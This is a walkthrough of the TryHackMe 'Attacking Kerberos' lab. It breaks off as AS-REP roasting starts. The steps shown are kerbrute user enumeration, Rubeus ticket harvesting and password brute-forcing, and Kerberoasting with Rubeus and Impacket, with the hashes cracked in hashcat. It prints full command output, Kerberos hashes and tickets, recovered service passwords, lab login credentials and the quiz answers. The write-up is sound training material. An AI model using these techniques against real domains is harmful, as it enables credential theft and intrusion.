# Attacking Kerberos

## Task 1 Introductions
Kerberos is the default authentication service for Microsoft Windows domains

*Ticket Granting Ticket (TGT)* - A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.
*Key Distribution Center (KDC)* - The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.
*Authentication Service (AS)* - The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.
*Ticket Granting Service (TGS)* - The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.
*Service Principal Name (SPN)* - A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account.
*KDC Long Term Secret Key (KDC LT Key)* - The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.
*Client Long Term Secret Key (Client LT Key)* - The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.
*Service Long Term Secret Key (Service LT Key)* - The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.
*Session Key* - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.
*Privilege Attribute Certificate (PAC)* - The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.

### Question 
- What does TGT stand for?`Ticket Granting Ticket`
- What does SPN stand for?`Service Principal Name`
- What does PAC stand for?`Privilege Attribute Certificate`
- What two services make up the KDC?`AS,TGS`

## Task 2 Enumeration w/ Kerbrute

Brute Force user enumeration 
```bash
┌──(kali㉿kali)-[~/TryHackMe/AttackingKerberos]
└─$ ./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 06/25/24 - Ronnie Flathers @ropnop

2024/06/25 08:28:57 >  Using KDC(s):
2024/06/25 08:28:57 >   CONTROLLER.local:88

2024/06/25 08:28:57 >  [+] VALID USERNAME:       admin1@CONTROLLER.local
2024/06/25 08:28:57 >  [+] VALID USERNAME:       administrator@CONTROLLER.local
2024/06/25 08:28:57 >  [+] VALID USERNAME:       admin2@CONTROLLER.local
2024/06/25 08:28:59 >  [+] VALID USERNAME:       machine2@CONTROLLER.local
2024/06/25 08:28:59 >  [+] VALID USERNAME:       machine1@CONTROLLER.local
2024/06/25 08:28:59 >  [+] VALID USERNAME:       sqlservice@CONTROLLER.local
2024/06/25 08:28:59 >  [+] VALID USERNAME:       httpservice@CONTROLLER.local
2024/06/25 08:28:59 >  [+] VALID USERNAME:       user2@CONTROLLER.local
2024/06/25 08:28:59 >  [+] VALID USERNAME:       user1@CONTROLLER.local
2024/06/25 08:28:59 >  [+] VALID USERNAME:       user3@CONTROLLER.local
2024/06/25 08:28:59 >  Done! Tested 100 usernames (10 valid) in 2.264 seconds
```

### Question 
- How many total users do we enumerate?`10`
- What is the SQL service account name?`sqlservice`
- What is the second "machine" account name?`machine2`
- What is the third "user" account name?`user3`

## Task 3 Harvesting & Brute-Forcing Tickets w/ Rubeus

To start this task you will need to RDP or SSH into the machine your credentials are -

Username: Administrator 
Password: P@$$W0rd 
Domain: controller.local

Using Rubeus.exe to harvesting credential `Rubeus.exe harvest /interval:30`
Bruteforcing using Rubeus.exe 
```bash
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe brute /password:Password1 /noticket 

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0 

[-] Blocked/Disabled user => Guest
[-] Blocked/Disabled user => krbtgt
[+] STUPENDOUS => Machine1:Password1
[*] base64(Machine1.kirbi):

      doIFWjCCBVagAwIBBaEDAgEWooIEUzCCBE9hggRLMIIER6ADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyi
      JTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIubG9jYWyjggQDMIID/6ADAgESoQMCAQKiggPx
      BIID7b9BZJgtgVT4XUHScthl9TJPst8tYJ9rF1bf54GCKR+qURci8mBdsvrFs84Yrf5hTKPxNQeeHKnA
      2nFJby101mxVZ1Mx8vGf/dBXPv1Mus+RL9KY8BzjuM2pjKIgxR5K6oZxPf9xUIn+I/Nyl1yc7J04cJa+
      aeoI0N7Cr2g38IZ/oic3wkEgtmkWN+1RuwOPkrcwWZZpsakJbesR+CJdPUKqmF810IgjgijN2oY/9c7R
      /7VhsVtVaNG3XVwVex65BHeamu4ZeW5Y2nbuEECSrZH+TfbhR4YFXtorAtFNF79ottjGwBgkjnBCjw/F
      Xuau8tSDSwZSTB+1aXaere9PfF44nxk0lXJv3SzZXtCEqP9gEowrS9UVRWKqim13uQ4nmI7WnD5i3pn2
      iO4L1Fy0Uk0e87ErBU8SlqbpOUEir7cqU7RhnrmC/9wLxKKN9kqHB9VWP/tAbafjWlJ7Gz+Hfmlare0E
      NZgpXdt1ZP7kLtJjKNYpgauvOeMTeet91yol4jAkCMlQ+PwYNaeSLxTIHqCLHazKil21YN6XiAug+u2P
      hiUpjgqK9RJ9zcMPPyshZ7TTN+iCyvQljMNKwxomGHRLKcvTxLrPPgGUXwT3SwIZfTOlbUb/97kpVDv6
      3H0Q0bY3i5+4SH1u2rrfmYSXF4hEfUG4Bh86+xKmStF/IpeIpRuAZtjQusOcu27lDViC+cqgSsZ4TzgP
      48WfGSRT5GoB3vM5yYDWG+g12db7oNQYFayaONYxd/HA9fCBYg3pgP4AonJeTyODL9n/2FfqBFz6zv7i
      2FrMkPzBtDC2a0AKyQvCf1OEwWbQ3dNBmSfrBDhvUVRUXnQB1BUJoXdmDn70yzOxFHYYD8KVoDpKctjp
      SrZCUtvcXuUU9ksbvJtQoHE4KnxZGbIzdV+15VtEOkG3dP57rcuPUsSfybI3lIp6E97801g3/nTckwWP
      v/+OW6ujQMmcidNYc5c8pBKZbrwm9iKaQzimsr5eh4TIHBhD/dDZi4aoaQme3v9+QnqwjjwNEYLvNUma
      2Qgf/EaV0D99x4bqSXf6vmEx7Y+5uyo8ppEtaxmXmWxnxOcU8rtIkGjGcELNbzLwd0QF77kYOCiDMKbm
      YCxyby7J/eoEOecKWEDJow2xl119IG/bG582RhfH/eierumFpS8ZJHwczusyYuGJm9uplQY4i5hcda4b
      QJpFc2TaBbpVXCMvo9SseIB9cMTxQlRNuO6UQGxAq1Jgl2VJv71dTsqOZui3MUohkIuFdZ1+TK1reoDn
      PZ7PRyMJtxn/rOR59z7xMB2zIsWm1ctHwtQbKArUS7kvgHN0R5qoisc5FnuFY3kzf6OB8jCB76ADAgEA
      ooHnBIHkfYHhMIHeoIHbMIHYMIHVoCswKaADAgESoSIEIPFP7wvl6hq7/SqCDTWgd1SVNxU0hdi2ptiS
      WBeMMqmNoRIbEENPTlRST0xMRVIuTE9DQUyiFTAToAMCAQGhDDAKGwhNYWNoaW5lMaMHAwUAQOEAAKUR
      GA8yMDI0MDYyNTAxNDY0OFqmERgPMjAyNDA2MjUxMTQ2NDhapxEYDzIwMjQwNzAyMDE0NjQ4WqgSGxBD
      T05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLmxvY2Fs

[+] Done
```
### Question
- Which domain admin do we get a ticket for when harvesting tickets?`Administrator`
- Which domain controller do we get a ticket for when harvesting tickets?`CONTROLLER-1`

## Task 4 Kerberoasting w/ Rubeus & Impacket
*Rubeus.exe kerberoast* This will dump the Kerberos hash of any kerberoastable users 
```bash
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe kerberoast

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0 


[*] Action: Kerberoasting 

[*] NOTICE: AES hashes will be returned for AES-enabled accounts. 
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts. 
                                                                             
[*] Searching the current domain for Kerberoastable users                    

[*] Total kerberoastable users : 2 


[*] SamAccountName         : SQLService                                     
[*] DistinguishedName      : CN=SQLService,CN=Users,DC=CONTROLLER,DC=local  
[*] ServicePrincipalName   : CONTROLLER-1/SQLService.CONTROLLER.local:30111 
[*] PwdLastSet             : 5/25/2020 10:28:26 PM                          
[*] Supported ETypes       : RC4_HMAC_DEFAULT                               
[*] Hash                   : $krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.loca 
                             l:30111*$584F9157CBABEBF2944692773DAC08EC$69A709E67B9CAC6BECE238CB61B5AD8A3151F4 
                             B56383DE96D9D1C3C2552BFB3DAE740577DEBC8134211E2C34AB101B643AD4B8DC25E635AC6F713D 
                             EC1CE2E40D5500BD7BC7425E18026266599C9E7364C784B727DBF9E62EB49ADF2636978C2DCD93E9 
                             06B59A3F00EEF5524FFDA6FA930296D83389A5C31141554F40FC0ED89D8726C4DE1AE981A15D53B1 
                             E5C67FF458C2CCDF8B0B7B82128DFF9A8C3F0A6332EC29A2FA1A7446D70CB99E7DAE3C7EF8622650 
                             F0BD72421AB69894992B88B1A4DDF61B036359AF5795935BF59A9BFEF2CB9BFB1387B9BC50743CEC 
                             23BDBBCC3B01DA91C3054EAF6AD13CB2C7510661AE18489343EB138307A8F3C0F497C0392E7E1394 
                             7133640311150E3F77BDB4FED0356D098E826E5FC1B03DA7CBB69060657758C202F9F943424D9C2E 
                             225537CFC1D60017B20A9A215E0C5CA0B5E01D492667618E436E7B7E6DD8A99C932B0F8991217B0E 
                             5668310FB27A68C0F25BEE9C0F8D9C2745BADAEFF9CAFB15BBCC13FA94F32631A2DB2CA2A9550BCE
                             A519FC91A0690CC9936A047889847D831B628743F66F184F0DDD90DF8734DC68FCEBB184FE5B0482
                             C55FB734820BC1CBB69032D00B13EBB8E4E991CA3AAC69B6A8D27FD3C9957F734A60327363E4E2AF
                             379C822D0961C1984189702BF74F7FDE9042DF6F73FBAED087D2444DE8672C900E60BBB110B40975
                             DFA08E2C4EF2FF49C11B315623F634A43747D653F2978B8E36FE49BCD68C88008BCAB607DE42A2E9
                             30B411E895C08F050111B489B4E0913692F23943F8CCCF3696C5A7F3B633F7ED85239BE27419D5F7
                             1CE1E480AFC30EC293313761E1C139DE3A1FAF55F44119312DC2C62EA29BB37A97DA1D4C3BA0B140
                             0DF6F99C7AF01A160DE98DDFF1BB10D403D983F9D92D880EB16E77AA0A537FF077BF43A2A073F4D9
                             AEC4074D60606430CCAA1D87EB71ACE8A69C0C9149D41E667F8E00C6C1BB201273EC485498139A66
                             90DD98BAEDE37A24BB5D2AC029AD12C81413D77F71B3E5C8B4EEF9462CA003D8EFA4DDEC5B354B71
                             3E1D8D05C49F5554AB9D050BB806108829299973B783705EDCA64C3C6D592DF73A8D40913F1B2495
                             4F67AA614CAE5E426F2580EEF67DA3C2F1EA5132687B871FD7AFF2ADABA15476CC4902FF171567A8
                             92CAC15DBAB32E0AE86E434284E4D922291278406597E82D87849B812CC3AF97297C39B742363725
                             45B0A79F0E71293101847739F495185D72C962422ADCCB0E8312DDA95EB3D0A8A7EC7B30B92D7EAE
                             568816293FA62938DFD0FF911838E217FFC4825A4C36A5BD35A87589DF8DDAE0BFCD3DDA5D0537B9
                             78A8466E603129C2240818CB1663A33A3F4148669DD0E724015B54A457DC58A178F66BABCAA5BDF9
                             BF66C73FB6B3DE9AA944B9E443DDB0D50890BF3FADC294E0E82FFE422CCA214A163472A2A55A3A8B
                             E199F3B3EC3731E48108B3D78D8C6D2C9602A2D568043E56536F61107EC6575FF578B6CE0C9DE405
                             19EF4702122EAC44F1937BDBEAEF2B56A36B7DF92BE8720F213E251DB76F2AFD07BB44B2E2BFA3B9
                             A58674BF996ED99F3CF8D41FF3EC2E495B57F8F249F38FE3918F5319F0BC5A13F17C622E22B92C8B
                             C3C2EBAEA7CC522BC543D319D8FE6EB413A2E50E095AA5852AD692FA93


[*] SamAccountName         : HTTPService
[*] DistinguishedName      : CN=HTTPService,CN=Users,DC=CONTROLLER,DC=local
[*] ServicePrincipalName   : CONTROLLER-1/HTTPService.CONTROLLER.local:30222
[*] PwdLastSet             : 5/25/2020 10:39:17 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*HTTPService$CONTROLLER.local$CONTROLLER-1/HTTPService.CONTROLLER.lo
                             cal:30222*$C7269925ED0518CD0F25D5C774675874$5CE95C55D43CAF42F77CAAB2643210862E0A
                             D413134E4B12009789EB24EAA8A5965891A70117569F49BDDAD02FAAF2B00725D2C1BF2FA5F421B5
                             E6D690B7CE825E33C2F296C84AB19488BF49856D3213E4C7A38DEB643C634DF80EC37A303CD392A6
                             7463AB48E77DC1A79F390C4927891CBD7BB8F070A097E761460AB013B23A9F26D9E9B912B18D1C32
                             9CCA6BD0D85200F2B084264F4A3BECC094BB7DCEC855B3151C22B08A8F291D7313C955D139F55E38
                             339E1AAC6E635AC5CDF76523C3B89A5FECDF9C7527191D4CD5E5815ABDC22AA83A709576C40AF692
                             9D91B3285A623A4D387B7EC4D4258912EE23D55F802C252CDCF5EE5DAE55C5C85D4769C09D415B59
                             84ED472DDF019DF26DE38B8C23168C8743413B77C69FA3D3C166614DACCEE5564C353643F91C7015
                             2F7E31DB602CFAD1A048C0DF6CB957E95F28F9400A37FEE95C8A070592CE216CD21E2C8BB13DE1BF
                             674BD8316E51170FAD23A934322D0BC3788E745FEE2C0A5DFABF9568A629FA0C578E3ED5193E2DDE
                             F4F09783B25A1CBA5963A54479DE7AA788F3801C64C698278869E76ACAFD4D01498242481C303B13
                             E2B13FFDE3E7840C09C2BC0743469A78CA22BAD1E7549595063B56F9D1BA8102D9AC5A7ED82A47C3
                             6E7CD25B5135D94FD3386C630F094927621B63BF0EA0E7DF33C9FF14D39D3853F13510352577DE4D
                             7B573018C1A3DDDC8CC3087A8AA4C7E43286127AB21008A0DA89054D424F41F04E4FF84A4DAFE9D6
                             DB0EF6A46FF516B86B3B812C83EE49E73FA9FB54452FCE29C65C003A783FD82B965A6E16AA24552C
                             A2B52A82FDCE29B98B455E87506B667A20E7408ED5728D91462DC3A2FC00AEBE958B9B955E540A38
                             7319AE5909E209C33D279089A6EBEC3D8A2EEED5468A75AAB3D19F4FD811D11AECE9CF0FA83EB2AC
                             5BC7B7376220FCE4167E31654D50CBABBC2C1799866A4FFE55EC0F1E88008B9158FF86E0BEE3C102
                             EC6FAFB56F0055FD2858603398A33D8D9072122A514038C1FDD1179C7C7ECDE752630F1149BDC54C
                             EF5794270C6A88971BBAD7AC0CD509620D03F67F9D9D7D5354DA7D68EB283465CC7C6EDD8C1AA2EC
                             0711D2596451038D8E4C63E5365E529BD54B2F2BA2C08F5F30EF582DFC88E899F25149D17C9B45A2
                             E06F85EE117D1E9635B17E99829593DF3F19DA6F6B817663503EBF04529812E24F2917C5D80D4816
                             E3BE87EAD57602234076BF7F8EBF4F35FDD0A0DE90105BB0C1DD7D50EC311459BD086747E05E036A
                             52097A7D519B44877D33B17F552986BC8F014051BE85AEE9E1D019C51BE2836FB0C814230C51C23B
                             944EA5CC057C6B54804CE401F78E5FA0C099EAE5E3DD44E400E1E03587F85234C40E9BA74068000F
                             BB4237128AA9BADE776CD44E2DF379159A344C3FEC6360119B7084A6BFF3C30754CC764356A2D582
                             1B982CEEB1C39870C6A1B0E60AC00CF6308ED9C13C7E7A7035AF55973239C3E58F00077C528A2D66
                             C8C9A99C77829CCE91871C3FD41B4EDF7866A4DEB56AB9221CE13193EE6C52FD27A306D671E794EF
                             59E3F4A2AEC31A2CB749EEE3C2B56AA86F872B079CEB86FF024A935A9F8DAF1D2117C0F8E4504621
                             0FD1BCB6C6B1A57434BEA3D57E44B7CE63E9398BBB3702E7D22E6DB00B9E
```
Cracking the hash using  `hashcat -m 13100 -a 0 hash.txt Pass.txt`
```bash
┌──(kali㉿kali)-[~/TryHackMe/AttackingKerberos/files]
└─$ hashcat -m 13100 -a 0 hash.txt Pass.txt --show
$krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.local:30111*$584f9157cbabebf2944692773dac08ec$69a709e67b9cac6bece238cb61b5ad8a3151f4b56383de96d9d1c3c2552bfb3dae740577debc8134211e2c34ab101b643ad4b8dc25e635ac6f713dec1ce2e40d5500bd7bc7425e18026266599c9e7364c784b727dbf9e62eb49adf2636978c2dcd93e906b59a3f00eef5524ffda6fa930296d83389a5c31141554f40fc0ed89d8726c4de1ae981a15d53b1e5c67ff458c2ccdf8b0b7b82128dff9a8c3f0a6332ec29a2fa1a7446d70cb99e7dae3c7ef8622650f0bd72421ab69894992b88b1a4ddf61b036359af5795935bf59a9bfef2cb9bfb1387b9bc50743cec23bdbbcc3b01da91c3054eaf6ad13cb2c7510661ae18489343eb138307a8f3c0f497c0392e7e13947133640311150e3f77bdb4fed0356d098e826e5fc1b03da7cbb69060657758c202f9f943424d9c2e225537cfc1d60017b20a9a215e0c5ca0b5e01d492667618e436e7b7e6dd8a99c932b0f8991217b0e5668310fb27a68c0f25bee9c0f8d9c2745badaeff9cafb15bbcc13fa94f32631a2db2ca2a9550bcea519fc91a0690cc9936a047889847d831b628743f66f184f0ddd90df8734dc68fcebb184fe5b0482c55fb734820bc1cbb69032d00b13ebb8e4e991ca3aac69b6a8d27fd3c9957f734a60327363e4e2af379c822d0961c1984189702bf74f7fde9042df6f73fbaed087d2444de8672c900e60bbb110b40975dfa08e2c4ef2ff49c11b315623f634a43747d653f2978b8e36fe49bcd68c88008bcab607de42a2e930b411e895c08f050111b489b4e0913692f23943f8cccf3696c5a7f3b633f7ed85239be27419d5f71ce1e480afc30ec293313761e1c139de3a1faf55f44119312dc2c62ea29bb37a97da1d4c3ba0b1400df6f99c7af01a160de98ddff1bb10d403d983f9d92d880eb16e77aa0a537ff077bf43a2a073f4d9aec4074d60606430ccaa1d87eb71ace8a69c0c9149d41e667f8e00c6c1bb201273ec485498139a6690dd98baede37a24bb5d2ac029ad12c81413d77f71b3e5c8b4eef9462ca003d8efa4ddec5b354b713e1d8d05c49f5554ab9d050bb806108829299973b783705edca64c3c6d592df73a8d40913f1b24954f67aa614cae5e426f2580eef67da3c2f1ea5132687b871fd7aff2adaba15476cc4902ff171567a892cac15dbab32e0ae86e434284e4d922291278406597e82d87849b812cc3af97297c39b74236372545b0a79f0e71293101847739f495185d72c962422adccb0e8312dda95eb3d0a8a7ec7b30b92d7eae568816293fa62938dfd0ff911838e217ffc4825a4c36a5bd35a87589df8ddae0bfcd3dda5d0537b978a8466e603129c2240818cb1663a33a3f4148669dd0e724015b54a457dc58a178f66babcaa5bdf9bf66c73fb6b3de9aa944b9e443ddb0d50890bf3fadc294e0e82ffe422cca214a163472a2a55a3a8be199f3b3ec3731e48108b3d78d8c6d2c9602a2d568043e56536f61107ec6575ff578b6ce0c9de40519ef4702122eac44f1937bdbeaef2b56a36b7df92be8720f213e251db76f2afd07bb44b2e2bfa3b9a58674bf996ed99f3cf8d41ff3ec2e495b57f8f249f38fe3918f5319f0bc5a13f17c622e22b92c8bc3c2ebaea7cc522bc543d319d8fe6eb413a2e50e095aa5852ad692fa93:MYPassword123#
$krb5tgs$23$*HTTPService$CONTROLLER.local$CONTROLLER-1/HTTPService.CONTROLLER.local:30222*$c7269925ed0518cd0f25d5c774675874$5ce95c55d43caf42f77caab2643210862e0ad413134e4b12009789eb24eaa8a5965891a70117569f49bddad02faaf2b00725d2c1bf2fa5f421b5e6d690b7ce825e33c2f296c84ab19488bf49856d3213e4c7a38deb643c634df80ec37a303cd392a67463ab48e77dc1a79f390c4927891cbd7bb8f070a097e761460ab013b23a9f26d9e9b912b18d1c329cca6bd0d85200f2b084264f4a3becc094bb7dcec855b3151c22b08a8f291d7313c955d139f55e38339e1aac6e635ac5cdf76523c3b89a5fecdf9c7527191d4cd5e5815abdc22aa83a709576c40af6929d91b3285a623a4d387b7ec4d4258912ee23d55f802c252cdcf5ee5dae55c5c85d4769c09d415b5984ed472ddf019df26de38b8c23168c8743413b77c69fa3d3c166614daccee5564c353643f91c70152f7e31db602cfad1a048c0df6cb957e95f28f9400a37fee95c8a070592ce216cd21e2c8bb13de1bf674bd8316e51170fad23a934322d0bc3788e745fee2c0a5dfabf9568a629fa0c578e3ed5193e2ddef4f09783b25a1cba5963a54479de7aa788f3801c64c698278869e76acafd4d01498242481c303b13e2b13ffde3e7840c09c2bc0743469a78ca22bad1e7549595063b56f9d1ba8102d9ac5a7ed82a47c36e7cd25b5135d94fd3386c630f094927621b63bf0ea0e7df33c9ff14d39d3853f13510352577de4d7b573018c1a3dddc8cc3087a8aa4c7e43286127ab21008a0da89054d424f41f04e4ff84a4dafe9d6db0ef6a46ff516b86b3b812c83ee49e73fa9fb54452fce29c65c003a783fd82b965a6e16aa24552ca2b52a82fdce29b98b455e87506b667a20e7408ed5728d91462dc3a2fc00aebe958b9b955e540a387319ae5909e209c33d279089a6ebec3d8a2eeed5468a75aab3d19f4fd811d11aece9cf0fa83eb2ac5bc7b7376220fce4167e31654d50cbabbc2c1799866a4ffe55ec0f1e88008b9158ff86e0bee3c102ec6fafb56f0055fd2858603398a33d8d9072122a514038c1fdd1179c7c7ecde752630f1149bdc54cef5794270c6a88971bbad7ac0cd509620d03f67f9d9d7d5354da7d68eb283465cc7c6edd8c1aa2ec0711d2596451038d8e4c63e5365e529bd54b2f2ba2c08f5f30ef582dfc88e899f25149d17c9b45a2e06f85ee117d1e9635b17e99829593df3f19da6f6b817663503ebf04529812e24f2917c5d80d4816e3be87ead57602234076bf7f8ebf4f35fdd0a0de90105bb0c1dd7d50ec311459bd086747e05e036a52097a7d519b44877d33b17f552986bc8f014051be85aee9e1d019c51be2836fb0c814230c51c23b944ea5cc057c6b54804ce401f78e5fa0c099eae5e3dd44e400e1e03587f85234c40e9ba74068000fbb4237128aa9bade776cd44e2df379159a344c3fec6360119b7084a6bff3c30754cc764356a2d5821b982ceeb1c39870c6a1b0e60ac00cf6308ed9c13c7e7a7035af55973239c3e58f00077c528a2d66c8c9a99c77829cce91871c3fd41b4edf7866a4deb56ab9221ce13193ee6c52fd27a306d671e794ef59e3f4a2aec31a2cb749eee3c2b56aa86f872b079ceb86ff024a935a9f8daf1d2117c0f8e45046210fd1bcb6c6b1a57434bea3d57e44b7ce63e9398bbb3702e7d22e6db00b9e:Summer2020
```
Got credential 
```
SQLService:MYPassword123#
HTTPService:Summer2020
```

Using IMPACKET
```bash
┌──(kali㉿kali)-[~/TryHackMe/AttackingKerberos/files]
└─$ impacket-GetUserSPNs controller.local/Machine1:Password1 -dc-ip 10.10.10.158 -request
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName                             Name         MemberOf                                                         PasswordLastSet             LastLogon                   Delegation 
-----------------------------------------------  -----------  ---------------------------------------------------------------  --------------------------  --------------------------  ----------
CONTROLLER-1/SQLService.CONTROLLER.local:30111   SQLService   CN=Group Policy Creator Owners,OU=Groups,DC=CONTROLLER,DC=local  2020-05-26 05:28:26.922527  2020-05-26 05:46:42.467441             
CONTROLLER-1/HTTPService.CONTROLLER.local:30222  HTTPService                                                                   2020-05-26 05:39:17.578393  2020-05-26 05:40:14.671872             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*SQLService$CONTROLLER.LOCAL$controller.local/SQLService*$50433987111f65d16837015cf8a29b2e$e4325e8d41d823c4de097380967bb27233d7cfc4bf336bcd4c565802bd6d412ad5fe1bd80d44d151f9b36dfead5e4769ab882d5b465bbe872346176d52db3d197f93e4eaeda09f791f0641902c9b6998b24dcaeb35b813ca16c054dd5bf4a3575fcde0852e8405a20da23871445e3c7bde18c9f3b522a2cbc1c8228d49579206c5208a0c10a5c29a668528077f44caec50a097b0b97fdbe1d5cfa5fc751dd762ab9f6b26afbf699b8dd24ecc62699571cac204b46311f96aeb406fec90c8f039560a74827dd634a44f92436aa9cb0e99cdac206233ada1759c75d8908cae94a57783bec897be707f224daf8fadea36fa823cbc2899f116fddd00b04e852b2b4ceb6b8905f11cd61d4c90179d14b7881c8252cba143a9eac1cbfffa27abeb85d62d847da7e7a7fb8c0c3c4d148866ec6e1b2440f4a93ad183c710990ad82236fbcdbf80cdf611b146034d475f06343dab3de9f3162089095b125bb2171b0a6bccf5abb979b9a532b1bcf93780ad55e85800740e6c2ad66ee8601e91a92c4f753c5edbd79aea3b64f017ac857b9645117dc1825bd384c98e00643826ab6a69c629463bec98b25eb9fb4d22203bf6dfd11668bd249e502213bfc5b52d2ca03508eaff0fbc2e1e46c92049e196cdc254d309c2c58942df804de2e7617cf074453bae6d105ae32ffec486599e24a4f8c6dfa7e3c6bf8ff3ad47ce922d6338711a0a984f1abbb874de29fe130532eefc9e8e85be25c6dafd4ccbb9836b4b24b78a1a3060904001dc0dea34f4d9c129b0b6b0c4a6fc90a396932ca4f312c1519ba7c75bc511fd236644acd356c3a8ed179c46e19654d039ad8707ff1c4e02ba3575617143c945704ab75d2579c046debe1bc3c8027b99be13436bf74feb04fbd72d36e1e35e21c2170bcd0498f44a87561ab600ef5605a87e78166badaf0631c23a1fc4a2b6c9cf4e94b65a9ada5b07ff0c8c77089dc634021a532e01082c42a97eddfcd3ee16f6b955c72dda495b7a6fd5b2f1e94635f3887fef5b11b9378c3ac5b32815aedad9fb8ac9a0f7ad4f17af88810f240b89cb5b72bdb3b91da2b3ccc7c35f4f88556051136487e60046f83f75537bd17a529f35d4f0bc90a00039a9ba192e5d903898719568194752db312ac3031c57ab4ad758c7410861a6833c986f2a99215856a262092e4be822f6f1cd28e760da8e10c775af0afaeaab03ab927dbcbeeaffa8ea5c961c3e6356c1ef644737a7fc17b9b95652057bdfa8c85b4fd333ae62d8be794431a8e7312da102ee02a4e25e94d131271a210408a6088a37095169c573733aef2d52e27c2d988aa9d51cbe9cbb5e7cd3c372f52500f2d225d993ec3f54cb3779b8d7d35ee653f2b4e373c433
$krb5tgs$23$*HTTPService$CONTROLLER.LOCAL$controller.local/HTTPService*$59e8223076a1652ed7c91b18889ae237$f1394dc88e892adc3a179c884a127a9bb8d36c1f73c76197139987fb5e05a1f483628276180514426cec8229b916353fb8e1c2be51078570e9992e9bf7c6dec081a51ced16a7fc54f8f7e5a882dde7ec85bea1a70c9cc9a28d7503225727e521409b314542764e2aa93a2bf3176ec8f1fde0afa6778e20550fe2c77faa20a56669b19ddee573ee70b0d98580df5fae4f5d6c088e18c71c5f45162089169a5c597ae0c85ae235db33638ce5bf46b1b5c6a533888d7f307f3bd359c83ae7552752142a3d2d4debab1a75240f0ed08f2d4897ec91ec84df1c6d4933593e805d8f693f6c4b880eb5cebe8a8d1c31685a6a6ed73e0380dff6b8797e53d09a8d8e9aefcfc859c15f630d649d9c83c95ba3b46e5c0b5b337b380023d54451b4ca612c74553ff9e6d3932ab07bd66ff765ae1c4069914c55ce4b8bd68b92453616d502140050b70feaffeee8dfe719f65fa9ec0f01ac3c62f697efc51567f31cddb0f7cc05e4f15a13bdb6cb438a8bbbd19f2074033bcda201fbe08c29f145674f5b3bc1140c87929894cbef6d68367b8861545524d2b7dd56dc31df002ca05043b153fd4c719900dee5e8ca2d1d8080687ade6c3851be91236160013355baeeee38295b7cd8c844e736358b05f90e6f11edf0b44bdefd1e753300fd0a40daeefa501fdaf4a7b6a7a653f9c9fa56efa15a5620bf8311d9ec86989c18bb7db0af3bba5150f0a6709b58d44da01624719fa27a6170213426ee62050be228bceedad5681c81364ded9d554f01e24577366ce98b79f7019084dad5f1852cc05fa0d7e01f42605ee2740ec6a3113e8cf6d1d9d3f3b79058141033ac688a2c0b94cfb607d9eab061039335c471232fbb043a05bd49c9bdecbe1dff3e307d9c66d90679245db8bd33038d1b24dd5de3bb5726050ebaa964cf6ab9ccde64ef112297d2d7fc44b71085a7e11f02c54ce78ba050ba24ecff8298748b22cef49af4ac0538a8cd244b7dfd39b64b00a7abc2e269b2c6e24bcc9c6cb844864208ae3f7be3ba13b203c0d3cf0291f0d9bd352fa2af46bdbd74ba6052538060c74d605076c56dcb18538e3fba4503295e5751305a79e32e768ee1858c9bacd779babfd9a1836ed979f22c97c137157805186408bbf355ebd1e2a42d63dc14a76b4bf6be6bc1630d7783aac8ed47fe6672fd5b52a54612001512d3b1d262731103d78402495e69dbdbc0b460ffa2e07aea37f38c9f92691ab8479fb904dfe651592be173f41a039fbaf309b492db8a55df800715990aeb202325648346b9757707b67d7c6772addf92f87095a4f7f288de171cdb056d359aa1f0d9c56125d081b3e7de89d1c4dfc12e3e5dd3d0323801a57baff0b6bf0d5f2fa5c54b58
```

### Question
- What is the HTTPService Password?`Summer2020`
- What is the SQLService Password?`MYPassword123#`


## Task 5 AS-REP Roasting w/ Rubeus
Dumping hash using `Rubeus.exe asreproast`
```bash
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe asreproast

   ______        _                       
  (_____ \      | |                      
   _____) )_   _| |__  _____ _   _  ___  
  |  __  /| | | |  _ \| ___ | | | |/___) 
  | |  \ \| |_| | |_) ) ____| |_| |___ | 
  |_|   |_|____/|____/|_____)____/(___/  
                                         
  v1.5.0                                 


[*] Action: AS-REP roasting

[*] Target Domain          : CONTROLLER.local

[*] Searching path 'LDAP://CONTROLLER-1.CONTROLLER.local/DC=CONTROLLER,DC=local' for AS-REP roastable users
